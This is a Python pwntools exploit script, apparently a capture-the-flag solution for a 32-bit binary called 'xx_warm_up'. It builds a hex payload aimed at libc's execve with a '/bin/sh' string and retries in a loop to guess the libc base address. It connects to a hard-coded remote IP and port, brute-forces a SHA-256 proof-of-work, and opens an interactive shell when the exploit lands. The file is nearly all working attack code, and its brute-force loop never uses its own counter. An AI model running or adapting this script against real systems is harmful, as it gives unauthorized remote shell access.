from pwn import *
import hashlib
#coding=utf-8
from one_gadget import generate_one_gadget

context.log_level="debug"

local=0

#libc= ELF("/lib/i386-linux-gnu/libc.so.6")
libc= ELF("./libc.so.6")
for i in range(0xf7002000,0xf7ff2000):

    one=0xf7df2000+libc.symbols["execve"]
    print hex(libc.symbols["execve"]) 
    aa=hex(one)[2:][::-1]
    one_gad=aa[1]+aa[0]+aa[3]+aa[2]+aa[5]+aa[4]+aa[7]+aa[6]
    #804A040
    #>>> "/bin/sh\x00".encode("hex")
    #'2f62696e2f736800'
    payload=one_gad+ '0'*8+"54a00408"+"0"*16+"2f62696e2f736800"+'0'*(0x48-8-4*7)*2+"44a00408"+'0'*4*2+"a0a00408"
    print len(payload),payload
    if local:
        p=process(argv=["./xx_warm_up",payload])
        #p.sendline(payload)
        #gdb.attach(p,"b *0x80484ef ")
    if local==0:
        p=remote("49.4.30.253",31337)
        key=p.recvuntil("\n",drop=True)
        print key
        skr = ""
        f = 0
        for i in range(10, 0xff):
            for j in range(10, 0xff):
                for k in range(10, 0xff):
                    for l in range(10,0xff):
                        if hashlib.sha256(key + chr(i)+chr(j)+chr(k)+chr(l)).hexdigest().startswith('00000'):
                            print key + chr(i) + chr(j) + chr(k)+chr(l)
                            skr = chr(i) + chr(j) + chr(k)+chr(l)
                            f = 1
                            break
                    if f == 1:
                        break
                if f == 1:
                    break
            if f==1:
                break

        #sleep(1)
        #gdb.attach(p)
        p.send(skr+payload)
        #p.recv()
    try:
        p.recv(timeout=1)
    except EOFError:
        p.close()
        continue
    else:
        sleep(0.1)

        p.interactive()


